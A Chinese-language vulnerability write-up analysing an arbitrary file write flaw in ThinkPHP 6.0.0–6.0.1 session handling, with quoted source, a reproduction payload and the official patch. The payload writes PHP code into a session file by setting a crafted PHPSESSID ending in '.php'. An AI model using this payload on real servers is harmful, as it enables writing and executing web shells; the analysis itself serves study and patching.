categories:
- cve复现
tags:
- cve复现
title: ThinkPHP6 任意文件操作漏洞分析
---
# ThinkPHP6 任意文件操作漏洞分析

## 利用条件

1. ThinkPHP6.0.0-6.0.1
2. 开启Sessoin中间件

## 漏洞复现

官方commit: https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2 

复现环境为:phpstudy+thinkphp6.0.1

`\app\controller\index.php`:

```php
<?php
namespace app\controller;

use app\BaseController;
use think\facade\Session;
class Index extends BaseController
{
    public function index($name)
    {
        Session::set('name', $name);
        return 'hello,' . Session::get('name');;
    }
    
}
```



`\app\middleware.php`

```php
<?php
// 全局中间件定义文件
return [
    // 全局请求缓存
    // \think\middleware\CheckRequestCache::class,
    // 多语言加载
    // \think\middleware\LoadLangPack::class,
//     Session初始化
     \think\middleware\SessionInit::class
];
```





根据漏洞的信息(任意文件操作),我们从`vendor\topthink\framework\src\think\session\Store.php` 的`save`函数开始进行分析

```php
public function save(): void
    {
        $this->clearFlashData();//清除原来的数据

        $sessionId = $this->getId();

        if (!empty($this->data)) {
            $data = $this->serialize($this->data);

            $this->handler->write($sessionId, $data);
        } else {
            $this->handler->delete($sessionId);
        }

        $this->init = false;
    }
```

跟进`$this->handler->write`方法看一下

```php
public function write(string $sessID, string $sessData): bool
    {
        $filename = $this->getFileName($sessID, true);
        $data     = $sessData;

        if ($this->config['data_compress'] && function_exists('gzcompress')) {
            //数据压缩
            $data = gzcompress($data, 3);
        }

        return $this->writeFile($filename, $data);
    }
```

再跟进`$this->writeFile`

```php
protected function writeFile($path, $content): bool
    {
        return (bool) file_put_contents($path, $content, LOCK_EX);
    }
```

因为`$data`可控,那么我们只要能控制`$path`我们就可以写shell进去了

而`$path`由`$this->getFileName($sessID, true);`得到

跟进去

```php
	protected function getFileName(string $name, bool $auto = false): string
    {
        if ($this->config['prefix']) {
            // 使用子目录
            $name = $this->config['prefix'] . DIRECTORY_SEPARATOR . 'sess_' . $name;
        } else {
            $name = 'sess_' . $name;
        }

        $filename = $this->config['path'] . $name;
        $dir      = dirname($filename);

        if ($auto && !is_dir($dir)) {
            try {
                mkdir($dir, 0755, true);
            } catch (\Exception $e) {
                // 创建失败
            }
        }

        return $filename;
    }
```

`$filename`直接由末端拼接参数`$name`

而`write`调用`getFileName`时直接将参数`$sessID`传入,`$sessID`由`$sessionId = $this->getId();`获得

```php
	public function getId(): string
    {
        return $this->id;
    }
```

`$this->id`时通过`setId()`来设置的

```php
	public function setId($id = null): void
    {
        $this->id = is_string($id) && strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
    }
```

如果`is_string($id) && strlen($id) === 32 `满足,则直接将`$id`的值赋给`$this->id`

查找调用setId的函数

![image3070](https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png)

其中`SessionInit`

```php
	public function handle($request, Closure $next)
    {
        // Session初始化
        $varSessionId = $this->app->config->get('session.var_session_id');
        $cookieName   = $this->session->getName();

        if ($varSessionId && $request->request($varSessionId)) {
            $sessionId = $request->request($varSessionId);
        } else {
            $sessionId = $request->cookie($cookieName);
        }

        if ($sessionId) {
            $this->session->setId($sessionId);
        }
	}
```

查找配置发现`$sessionId`=>`$_COOKIE['PHPSESSID']`

因此构造payload

```
http://127.0.0.1/tp/public/index.php?s=/index/index/&name=%3C?php%20phpinfo();?%3E

Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php

访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php
```



## 补丁分析

```php
public function setId($id=null):void
{
    $this->id = is_string($id) && strlen($id) === 32 && ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
}
```

在`setId`中增加了对`$id`的校验:`ctype_alnum($id)`,只允许数字或字母,来避免任意文件操作



## 参考

 https://paper.seebug.org/1114/#_1 